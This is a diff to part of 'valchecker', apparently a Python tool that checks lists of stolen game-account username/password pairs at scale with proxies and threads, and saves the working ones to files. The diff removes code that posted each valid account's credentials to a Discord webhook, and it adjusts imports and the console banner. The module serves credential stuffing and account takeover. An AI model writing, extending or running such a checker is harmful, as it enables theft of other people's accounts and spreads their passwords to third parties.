@@ -1,5 +1,5 @@
 import os
-from codeparts import systems,auth,staff
+from codeparts import stuff, systems,auth
 from datetime import datetime
 import threading
 import time
@@ -10,7 +10,7 @@ from colorama import Fore
 import ctypes
 
 syst=systems.system()
-stff=staff.staff()
+stff=stuff.staff()
 class fastcheck:
     def __init__(self,accounts,count,settings:list,proxylist,useragent:str) -> None:
         self.useragent = useragent
@@ -22,11 +22,9 @@ class fastcheck:
         self.max_rlimits=settings['max_rlimits']
         self.rlimit_wait=settings['rlimit_wait']
         self.cooldown=int(settings['cooldown'])
-        self.webhook=settings['webhook'].replace(' ','')
         self.print_sys=bool(settings['print_sys'])
         self.esttime='N/A'
         self.newfolder=settings['new_folder']
-        self.uploadwh=False
         if self.newfolder=='True':
             dtnw=str(datetime.now()).replace(' ','_').replace(':','.')
             self.outpath=self.parentpath+f'\\output\\{dtnw}'
@@ -50,7 +48,6 @@ class fastcheck:
         
         self.proxycount=len(proxylist) if self.proxylist != None else 0
 
-        self.whtext=f"{Fore.LIGHTRED_EX}Not using a webhook{Fore.RESET}"
         self.count=count
         os.system(f'mode con: cols=120 lines=25')
         self.threadam=1
@@ -58,12 +55,6 @@ class fastcheck:
         self.threadam= self.threadam if 1000>self.threadam>0 else self.proxycount if self.proxycount > 1 else 3
 
     def main(self):
-        if self.webhook != '':
-            if inquirer.confirm(
-                message="Do you want to receive all valid accounts in ur webhook?", default=True
-            ).execute():
-                self.uploadwh=True
-                self.whtext=f'{Fore.LIGHTGREEN_EX}Using the webhook{Fore.RESET}'
 
         self.startedtesting=syst.getmillis()
         num=0
@@ -157,19 +148,6 @@ class fastcheck:
                     if mailverif==True and banuntil==None:
                         self.unverifiedmail+=1
                     
-                    if self.uploadwh==True:
-                        from discord_webhook import DiscordWebhook, DiscordEmbed
-                        dcwebhook = DiscordWebhook(url=self.webhook)
-                        embed = DiscordEmbed(title='New valid account', color='34eb43')
-                        if banuntil!=None:
-                            embed = DiscordEmbed(title='New tempbanned account', color='ff4400')
-                            embed.add_embed_field(name='Ban Until',value=str(banuntil))
-                        embed.set_author(name='ValChecker | FastCheck')
-                        embed.set_timestamp()
-                        embed.add_embed_field(name='LogPass', value=account)
-                        embed.add_embed_field(name='Full Access', value=mailverif)
-                        dcwebhook.add_embed(embed)
-                        response=dcwebhook.execute()
                     if banuntil is None:
                         with open(f'{self.outpath}\\fastcheck_valid.txt','a',encoding='utf-8') as f:
                             f.write(account+'\n')
@@ -208,7 +186,7 @@ class fastcheck:
     {reset}
     {syst.center('https://github.com/LIL-JABA/valchecker')}
 
-        Proxies: {cyan}{self.proxycount}{reset} | Threads:  {cyan}{self.threadam}{reset} | Accounts: {cyan}{self.count}{reset} | Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{self.count}{reset} | {self.whtext}
+        Proxies: {cyan}{self.proxycount}{reset} | Threads:  {cyan}{self.threadam}{reset} | Accounts: {cyan}{self.count}{reset} | Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{self.count}{reset}
         {syst.progressbar(self.checked,self.count)}
     {reset}
                                 {Fore.MAGENTA} ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
